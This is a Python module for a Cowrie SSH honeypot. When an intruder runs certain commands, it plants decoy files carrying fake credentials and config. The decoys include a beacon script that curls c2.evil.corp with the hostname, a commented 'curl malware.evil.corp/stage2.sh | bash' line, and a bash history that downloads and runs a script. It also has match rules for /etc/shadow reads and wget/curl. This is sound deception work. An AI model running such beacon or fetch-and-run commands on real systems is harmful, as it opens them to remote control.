#!/usr/bin/env python3
"""
MORPH - Reactive Deception Layer

Provides reaction logic for planting fake files into Cowrie's honeyfs.
This module does NOT watch files - it exposes process_event() to be called
by external log processors.
"""

import random
import string
from datetime import datetime
from pathlib import Path
from typing import Callable, Any

# Paths (native Linux paths)
HONEYFS_ROOT = "/home/nb/cowrie/honeyfs"
FS_PICKLE = "/home/nb/cowrie/src/cowrie/data/fs.pickle"
FSCTL = "/home/nb/cowrie/cowrie-env/bin/fsctl"
PID_FILE = "/home/nb/cowrie/twistd.pid"
REACTOR_LOG = "morph/reactor.log"


def _log(message: str) -> None:
    """Log a reactor action."""
    log_path = Path(REACTOR_LOG)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(log_entry)


def _write_honeyfs_file(relative_path: str, content: str) -> bool:
    """Write a file into the honeyfs directory."""
    full_path = Path(HONEYFS_ROOT) / relative_path
    
    # Don't overwrite if already exists
    if full_path.exists():
        return False
    
    try:
        full_path.parent.mkdir(parents=True, exist_ok=True)
        full_path.write_text(content, encoding="utf-8")
        _log(f"Created: {relative_path}")
        return True
    except IOError as e:
        _log(f"Error creating {relative_path}: {e}")
        return False


def _create_empty_file(relative_path: str) -> bool:
    """Create an empty file in honeyfs."""
    full_path = Path(HONEYFS_ROOT) / relative_path
    
    if full_path.exists():
        return False
    
    try:
        full_path.parent.mkdir(parents=True, exist_ok=True)
        full_path.touch()
        _log(f"Created (empty): {relative_path}")
        return True
    except IOError as e:
        _log(f"Error creating {relative_path}: {e}")
        return False


def _random_string(length: int = 8) -> str:
    """Generate a random alphanumeric string."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


# === Fake Content Templates ===

FAKE_CONFIG_PHP = """<?php
// Database configuration - Production
// Last updated: 2024-03-10

define('DB_HOST', 'db.internal.corp');
define('DB_NAME', 'webapp_prod');
define('DB_USER', 'webapp_admin');
define('DB_PASS', 'Pr0d_DB_P@ss_2024!');

// API Keys
define('STRIPE_SECRET', 'sk_live_51HG8k2CjEXAMPLEKEY');
define('AWS_KEY', 'AKIAIOSFODNN7EXAMPLE');

// Debug mode - DISABLE IN PRODUCTION
define('DEBUG', false);

$conn = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
?>
"""

FAKE_GIT_CONFIG = """[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = git@github.com:internal-corp/webapp-prod.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
[user]
	name = Deploy Bot
	email = deploy@internal.corp
"""

FAKE_MONITOR_SCRIPT = """#!/bin/bash
# Persistence monitor - DO NOT REMOVE
# Contact: admin@internal.corp

while true; do
    curl -s http://c2.evil.corp/heartbeat?id=$(hostname) > /dev/null 2>&1
    sleep 300
done
"""

FAKE_SSH_KEY = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7z8k3N5F5L... (truncated) deploy@internal.corp
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk9p2R7T... (truncated) backup@internal.corp
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... jenkins@ci.internal.corp
"""

FAKE_BASH_HISTORY = """cd /var/www/html
cat config.php
mysql -u root -p'R00t_DB_P@ss!' webapp_prod
mysqldump webapp_prod > /tmp/dump.sql
scp /tmp/dump.sql backup@10.0.0.5:/backups/
rm /tmp/dump.sql
curl -O http://updates.internal.corp/deploy.sh
chmod +x deploy.sh
./deploy.sh
history -c
"""

FAKE_BACKUP_SCRIPT = """#!/bin/bash
# Nightly backup script
# Runs via cron at 2:00 AM

BACKUP_DIR="/opt/backup"
DB_USER="backup_svc"
DB_PASS="B@ckup_2024_Secure!"
DB_NAME="production"

DATE=$(date +%Y%m%d)

mysqldump -u$DB_USER -p$DB_PASS $DB_NAME | gzip > $BACKUP_DIR/db_backup_$DATE.sql.gz

# Sync to remote
rsync -avz $BACKUP_DIR/ backup@storage.internal.corp:/archives/

# Cleanup old backups (keep 30 days)
find $BACKUP_DIR -name "*.sql.gz" -mtime +30 -delete
"""

FAKE_MALWARE_PLACEHOLDER = """#!/bin/bash
# Dropped payload - detected and neutered
# Original hash: {hash}
# Detected: {date}

echo "Payload intercepted by security team"
exit 0

# --- Original content below (defanged) ---
# curl http://malware.evil.corp/stage2.sh | bash
# This system has been cleaned.
"""


# === Reaction Handlers ===

def react_to_www(cmd: str, session_id: str) -> None:
    """React to /var/www exploration."""
    _log(f"[{session_id}] Triggered: www exploration ({cmd})")
    
    _write_honeyfs_file("var/www/html/config.php", FAKE_CONFIG_PHP)
    _write_honeyfs_file("var/www/html/.git/config", FAKE_GIT_CONFIG)


def react_to_process_list(cmd: str, session_id: str) -> None:
    """React to process listing commands."""
    _log(f"[{session_id}] Triggered: process listing ({cmd})")
    
    _write_honeyfs_file("tmp/.monitor", FAKE_MONITOR_SCRIPT)


def react_to_passwd_access(cmd: str, session_id: str) -> None:
    """React to password file access."""
    _log(f"[{session_id}] Triggered: passwd/shadow access ({cmd})")
    
    _write_honeyfs_file("home/deploy/.ssh/authorized_keys", FAKE_SSH_KEY)
    _write_honeyfs_file("home/deploy/.bash_history", FAKE_BASH_HISTORY)


def react_to_file_search(cmd: str, session_id: str) -> None:
    """React to find/locate commands."""
    _log(f"[{session_id}] Triggered: file search ({cmd})")
    
    _create_empty_file("opt/backup/db_backup_2024.sql.gz")
    _write_honeyfs_file("opt/scripts/backup.sh", FAKE_BACKUP_SCRIPT)


def react_to_download(cmd: str, session_id: str) -> None:
    """React to wget/curl downloads."""
    _log(f"[{session_id}] Triggered: download attempt ({cmd})")
    
    fake_name = f".{_random_string(6)}.sh"
    fake_content = FAKE_MALWARE_PLACEHOLDER.format(
        hash=_random_string(32),
        date=datetime.now().strftime("%Y-%m-%d %H:%M")
    )
    _write_honeyfs_file(f"tmp/{fake_name}", fake_content)


# === Reaction Rules ===

REACTION_RULES: list[tuple[list[str], Callable]] = [
    # (patterns to match, handler function)
    (["ls /var/www", "cd /var/www", "ls -la /var/www"], react_to_www),
    (["ps aux", "ps -ef", "top", "htop"], react_to_process_list),
    (["cat /etc/passwd", "cat /etc/shadow", "/etc/passwd", "/etc/shadow"], react_to_passwd_access),
    (["find /", "find .", "locate ", "find -name"], react_to_file_search),
    (["wget ", "curl ", "curl -O", "wget -O"], react_to_download),
]


def check_reactions(command: str, session_id: str) -> None:
    """Check if a command triggers any reactions."""
    cmd_lower = command.lower()
    
    for patterns, handler in REACTION_RULES:
        for pattern in patterns:
            if pattern.lower() in cmd_lower:
                handler(command, session_id)
                return  # Only trigger one reaction per command


def process_event(event: dict[str, Any]) -> None:
    """
    Process a single Cowrie log event and trigger reactions.
    
    Args:
        event: A dict parsed from a cowrie.json log line
    """
    session_id = event.get("session", "unknown")
    command = event.get("input", "")
    
    if command:
        check_reactions(command, session_id)


if __name__ == "__main__":
    print("MORPH Reactor")
    print("=" * 60)
    print(f"Honeyfs root: {HONEYFS_ROOT}")
    print(f"Log file: {REACTOR_LOG}")
    print()
    print("This module provides process_event() for external callers.")
    print()
    
    # Test with a sample event
    print("Testing with sample event...")
    test_event = {
        "session": "test_session",
        "input": "ls /var/www"
    }
    process_event(test_event)
    print("Done. Check morph/reactor.log for output.")
